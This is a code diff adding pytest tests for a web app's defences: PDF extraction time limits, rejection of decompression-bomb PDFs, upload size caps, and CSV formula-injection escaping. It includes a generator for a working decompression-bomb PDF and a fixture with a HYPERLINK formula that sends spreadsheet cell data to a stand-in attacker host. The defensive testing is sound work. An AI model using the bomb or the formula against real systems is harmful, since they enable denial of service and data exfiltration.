@@ -21,8 +21,10 @@ import datetime
 import io
 import logging
 import time
+import zlib
 from types import SimpleNamespace
 
+import pypdf
 import pytest
 from fastapi import HTTPException
 from starlette.datastructures import Headers, UploadFile
@@ -55,6 +57,35 @@ def thread_calls(monkeypatch):
 
     monkeypatch.setattr(asyncio, "to_thread", recording)
     return calls
+
+
+def _bomb_pdf(inflated_mb: int) -> bytes:
+    """A one-page PDF whose content stream inflates to `inflated_mb` MB of spaces."""
+    squeeze = zlib.compressobj(9)
+    stream = b"".join(squeeze.compress(b" " * (1024 * 1024)) for _ in range(inflated_mb)) + squeeze.flush()
+    objs = [
+        b"<< /Type /Catalog /Pages 2 0 R >>",
+        b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>",
+        # A font, or pypdf 6 skips a page that can hold no text without decoding it.
+        b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R"
+        b" /Resources << /Font << /F1 << /Type /Font /Subtype /Type1 /BaseFont /Helvetica >> >> >> >>",
+        b"<< /Length %d /Filter /FlateDecode >>\nstream\n" % len(stream) + stream + b"\nendstream",
+    ]
+    out = io.BytesIO()
+    out.write(b"%PDF-1.4\n")
+    offsets = []
+    for number, body in enumerate(objs, start=1):
+        offsets.append(out.tell())
+        out.write(b"%d 0 obj\n" % number + body + b"\nendobj\n")
+    xref = out.tell()
+    out.write(b"xref\n0 %d\n0000000000 65535 f \n" % (len(objs) + 1))
+    for offset in offsets:
+        out.write(b"%010d 00000 n \n" % offset)
+    out.write(b"trailer\n<< /Size %d /Root 1 0 R >>\nstartxref\n%d\n%%%%EOF\n" % (len(objs) + 1, xref))
+    return out.getvalue()
+
+
+_PYPDF_CAPS_INFLATION = int(pypdf.__version__.split(".")[0]) >= 6
 
 
 def _request(**state):
@@ -100,6 +131,26 @@ class TestStudioExtraction:
         pages = D.extract_pages(_pdf(["abcdefgh", "ijklmnop", "qrstuvwx", "yz"]), "pdf")
         assert pages == ["abcdefgh", "ij", "", ""]
 
+    def test_pages_past_the_time_budget_are_counted_but_not_read(self, monkeypatch):
+        """A page of drawing operators costs CPU and yields no text: the clock stops it."""
+        from app.services import studio_docs as D
+
+        pdf = _pdf(["page 0", "page 1", "page 2"])
+        clock = iter(range(0, 10_000, 40))  # each reading is 40 s after the last
+        monkeypatch.setattr(D.time, "monotonic", lambda: next(clock))
+        monkeypatch.setattr(D, "MAX_EXTRACT_SECONDS", 60)
+        assert D.extract_pages(pdf, "pdf") == ["page 0", "", ""]
+
+    @pytest.mark.skipif(not _PYPDF_CAPS_INFLATION, reason="pypdf 6.x, as pinned in requirements.txt, caps inflation")
+    def test_a_decompression_bomb_is_refused_not_inflated(self):
+        from app.services import studio_docs as D
+
+        bomb = _bomb_pdf(100)  # about 100 KB that inflates to 100 MB
+        started = time.perf_counter()
+        with pytest.raises(Exception, match="(?i)limit"):
+            D.extract_pages(bomb, "pdf")
+        assert time.perf_counter() - started < 2  # 4.3.1 inflated and parsed it: ~4.5 s
+
     def test_text_documents_are_cut_at_the_budget(self, monkeypatch):
         from app.services import studio_docs as D
 
@@ -138,6 +189,24 @@ class TestInvoiceParse:
         text = O._extract_pdf_text(_pdf(["a" * 25, "b" * 25, "c" * 25]))
         assert len(text) == 30
         assert "c" not in text  # stopped before the third page
+
+    def test_pages_past_the_time_budget_are_not_read(self, monkeypatch):
+        from app.services import openrouter as O
+
+        pdf = _pdf(["first page", "second page", "third page"])
+        clock = iter(range(0, 10_000, 10))  # each reading is 10 s after the last
+        monkeypatch.setattr(O.time, "monotonic", lambda: next(clock))
+        monkeypatch.setattr(O, "_MAX_INVOICE_EXTRACT_SECONDS", 15)
+        assert O._extract_pdf_text(pdf) == "first page"
+
+    @pytest.mark.skipif(not _PYPDF_CAPS_INFLATION, reason="pypdf 6.x, as pinned in requirements.txt, caps inflation")
+    def test_a_decompression_bomb_yields_no_text_quickly(self):
+        from app.services.openrouter import _extract_pdf_text
+
+        bomb = _bomb_pdf(100)
+        started = time.perf_counter()
+        assert _extract_pdf_text(bomb) == ""
+        assert time.perf_counter() - started < 2  # 4.3.1: ~4.5 s
 
     def test_a_long_digit_run_is_not_quadratic(self):
         """16k digits took about 4 s before the (?<!\\d) anchor; 50k would take ~40 s."""
@@ -363,6 +432,27 @@ class TestUploadMiddleware:
         # Refused before the route's auth check, which would have said 401.
         assert res.json()["error"]["message"].startswith("File too large")
 
+    def test_an_oversized_body_with_no_length_is_413_through_the_full_app(self, monkeypatch):
+        """Streamed with no Content-Length, the cap trips inside form parsing."""
+        monkeypatch.setenv("APP_SECRET", "x-local-test-secret-xxxxxxxxxxxx")
+        from fastapi.testclient import TestClient
+        import app.main as M
+        from app.utils import uploads as U
+
+        monkeypatch.setattr(U.settings, "max_upload_bytes", 1024)
+
+        def body():
+            yield b'--b\r\nContent-Disposition: form-data; name="file"; filename="a.png"\r\n'
+            yield b"Content-Type: image/png\r\n\r\n"
+            for _ in range(40):
+                yield b"x" * 4096
+            yield b"\r\n--b--\r\n"
+
+        res = TestClient(M.app).post("/api/pages/upload", content=body(),
+                                     headers={"content-type": "multipart/form-data; boundary=b"})
+        assert res.status_code == 413
+        assert res.json()["error"]["message"].startswith("File too large")
+
     def test_a_small_multipart_body_passes_through(self, monkeypatch):
         monkeypatch.setenv("APP_SECRET", "x-local-test-secret-xxxxxxxxxxxx")
         from fastapi.testclient import TestClient
@@ -578,6 +668,30 @@ class TestCsvSafe:
         cell = dict(zip(*rows))
         assert cell["Remark"].startswith("'=HYPERLINK")
         assert cell["Invoice Number"].startswith("'=")
+
+    def test_admin_user_timeline_export(self, monkeypatch):
+        """The email and ip columns come from sign-in attempts, not from staff."""
+        from app.routers import admin as A
+
+        class Pool:
+            async def fetchrow(self, sql, *a):
+                return {"id": "u1", "email": "u@example.com", "first_name": None,
+                        "last_name": None, "full_name": None}
+
+            async def fetch(self, sql, *a):
+                return [{"created_at": datetime.datetime(2026, 1, 1, tzinfo=datetime.timezone.utc),
+                         "event_type": "login_failed", "role": None,
+                         "email": '=HYPERLINK("https://evil.example/?d="&A2,"x")', "status": "failed",
+                         "ip": "@SUM(1+1)", "actor_email": None, "metadata": '{"reason": "-1"}'}]
+
+        monkeypatch.setattr(A, "get_pool", lambda: Pool())
+        res = asyncio.run(A.admin_user_timeline_export("u1", fmt="csv", _="admin"))
+        header, row = list(csv.reader(io.StringIO(res.body.decode())))
+        cell = dict(zip(header, row))
+        assert cell["email"].startswith("'=HYPERLINK")
+        assert cell["ip"] == "'@SUM(1+1)"
+        assert cell["event_type"] == "login_failed"
+        assert cell["metadata"] == '{"reason": "-1"}'
 
 
 # ── 6. sync_log retention ────────────────────────────────────────────────────
